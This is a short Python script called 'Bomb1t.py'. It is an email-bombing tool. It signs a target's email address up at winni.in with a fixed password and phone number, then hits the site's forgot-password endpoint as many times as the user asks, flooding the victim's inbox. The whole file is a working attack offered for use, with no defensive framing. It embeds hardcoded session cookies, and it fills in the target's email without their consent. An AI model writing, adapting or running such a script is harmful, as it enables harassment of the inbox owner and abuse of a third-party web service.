#!/usr/bin/python

import requests
import sys


sys.tracebacklimit = 0

#Cool banner <3

print(""" 
  ____                  _    __ _   
 |  _ \                | |  /_ | | 
 | |_) | ___  _ __ ___ | |__ | | |_  
 |  _ < / _ \| '_ ` _ \| '_ \| | __|
 | |_) | (_) | | | | | | |_) | | |_ 
 |____/ \___/|_| |_| |_|_.__/|_|\__|
                                    
                                    
""" + 'Usage: Bomb1t.py <E-mail>\n')

eml = sys.argv[1]

cookies = {
    '_ga': 'GA1.2.300903347.1563226137',
    'cto_lwid': '4fd486e8-493d-4bab-b2df-9983b307eda3',
    'cto_idcpy': 'd3512bb4-2613-4136-ac66-544aacc27c64',
    '__zlcmid': 'tIiO6yAYlOnZrR',
    '__zlcprivacy': '1',
    'AWSALBTG': 'OE14koOb8aK3S9BcIhJcj1W4Yco440vAZiIG5S3ypbq2hu0orbW6O8a4yknVqzVG0hAVJaiLa3pmawAABh8pa7w4LKMC+RvjQyiVzxUHb4Tdfpr4d+10o9TaeKZE6fqZlZQ7+X6i0xIRClKv43dJjscNfWfPzU+LrEIfBtYaukhh',
    'AWSALBTGCORS': 'OE14koOb8aK3S9BcIhJcj1W4Yco440vAZiIG5S3ypbq2hu0orbW6O8a4yknVqzVG0hAVJaiLa3pmawAABh8pa7w4LKMC+RvjQyiVzxUHb4Tdfpr4d+10o9TaeKZE6fqZlZQ7+X6i0xIRClKv43dJjscNfWfPzU+LrEIfBtYaukhh',
    'AWSALB': '0lH+Q4cXx6yeuhEXNgO+MNgG97lLbefT8FJOOOeS9fHgezLmUgkccilncURFEbFbaP6zNPJOuxeUK+io7p5ByRBjYciZCLQHNEZNiVY6ntjscgz3uY/QNo+wdE4O',
    'AWSALBCORS': '0lH+Q4cXx6yeuhEXNgO+MNgG97lLbefT8FJOOOeS9fHgezLmUgkccilncURFEbFbaP6zNPJOuxeUK+io7p5ByRBjYciZCLQHNEZNiVY6ntjscgz3uY/QNo+wdE4O',
    'JSESSIONID': '72161EB2AEEACF2D14EEF435E03646DC',
    'ud': '49388B00-D6D5-457F-89DB-E4FDD066062D',
    '_gid': 'GA1.2.2045085124.1588257312',
    '_fbp': 'fb.1.1588257312732.1125931670',
    '__adroll_fpc': '91e27b3ac116f9762ab9cea467fdb0f9-1588257314949',
    '__ar_v4': 'CN3LQCY32VFYHLOR6OAAPR%3A20200430%3A10%7CJ2AVZL2H45A7PB4IUSOUR5%3A20200430%3A10%7C3EBBBX32ZREPRL5SN3ZVTW%3A20200430%3A10',
    'cto_bundle': 'ml26Hl9MdkN0R3FaV3Z2T09zNHh5ejlvTjJRUTl0OW5lNlRnRTZQNUE5Y2VjUXclMkI1UkdGaUk3Zm1UMkhMNFdTMFlJbnROTzNWajFWaEtNZENDMzVTRW54dlolMkZsbmxVbyUyRnRucDlBRjM0WkpPNjBmZjh1STVmN0J6em0lMkZ5b3REaFhralBSUWpFVHZuTTU2SXFsSTdOOEFmV0IyUk1QRHRpNUJ4YWs0eEVBVWFPM1dSampydXZmUmY3UnFSQWxObnRzMUFMZw',
    'v': '62445100',
    '_gat_UA-38175959-1': '1',
    '_uetsid': '_ueta17c2c13-3615-0bd3-3979-15dfabd17a68',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': 'https://www.winni.in',
    'Referer': 'https://www.winni.in/customer/login',
}

data = {
  'email': eml,
  'password': 'passWORD123',
  'name': 'user',
  'mobile': '9999888822'
}



r1 = requests.post('https://www.winni.in/cs/customer/signup', headers=headers, cookies=cookies, data=data)
if(r1.status_code != 200):
    print(' \033[1;31m[-]\033[1;m Error Occured !\n')
    sys.exit()


if(r1.text[12] == 'f'):
    #print('already registered !')
    cnt = int(input('  \033[1;32m[+]\033[0m Count: '))
    
    for i in range(cnt):
        r2 = requests.post('https://www.winni.in/customer/forgot-password', headers=headers, cookies=cookies, data={'email':eml})
    print ('  \033[1;32m[+]\033[0m Bombed: '+str(cnt))
else:
    count = int(input('  \033[1;32m[+]\033[0m Count: '))
    for i in range(count):
        r2 = requests.post('https://www.winni.in/customer/forgot-password', headers=headers, cookies=cookies, data={'email':eml})
    print ('  \033[1;32m[+]\033[0m Bombed: '+str(count))

print('  \033[1;32m[+]\033[0m Done\n')


